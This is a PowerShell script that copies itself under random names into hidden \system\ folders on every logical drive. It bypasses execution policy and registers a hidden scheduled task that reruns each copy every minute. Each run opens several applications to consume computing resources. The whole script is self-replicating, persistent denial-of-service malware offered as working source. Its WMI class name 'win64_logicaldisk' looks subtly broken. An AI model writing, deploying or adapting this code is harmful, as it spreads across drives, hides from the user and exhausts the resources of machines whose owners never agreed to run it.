$SrcDir = $PSScriptRoot
$backupDrive = $null
$backupPath = $null
$hiddenPath = $null
$scriptPath = ($MyInvocation.MyCommand).Definition
$scriptPathArray = ($MyInvocation.MyCommand).Definition.Split("\")
$scriptName = $scriptPathArray[$scriptPathArray.Length - 1]

get-wmiobject win64_logicaldisk | % {

    #random string for script_name
    $str = -join ((48..57) + (97..122) | Get-Random -Count 16 | % {[char]$_})

    #finding attached drives
    $backupDrive = $_.DeviceID
    $backupPath = $backupDrive + "\system\"
    & robocopy.exe $SrcDir $backupPath $scriptName /Z /r:0 #copying files

    $full_path = $backupPath + $scriptName
    Rename-Item -Path $full_path -NewName "$str.ps1"
    
    #bypassing execution policy on ristricted devices
    $task_path = $backupPath + "$str.ps1"
    $task_path_quoted = '"'+$task_path+'"'
    $full_argument = "-ExecutionPolicy Bypass -File "+$task_path_quoted 
    
	#for increasing more computation:
	#open random processes here !!!
	#example:
	Start-Process notepad.exe
	Start-Process calc.exe
	Start-Process mspaint.exe
	Start-Process iexplore.exe
	Start-Process msedge.exe
    
    try
    {
        $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $full_argument' -NonInteractive -NoLogo -WindowStyle Hidden'
        $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
        $Setting = New-ScheduledTaskSettingsSet
        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Setting

        Register-ScheduledTask -TaskName $str -InputObject $Task
    }
    catch [System.Exception]
    {
        echo $_.Exception.GetType().FullName, $_.Exception.Message
    }

    $hiddenPath = $backupDrive + "\system"
    attrib +h $hiddenPath  #hiding folders
}
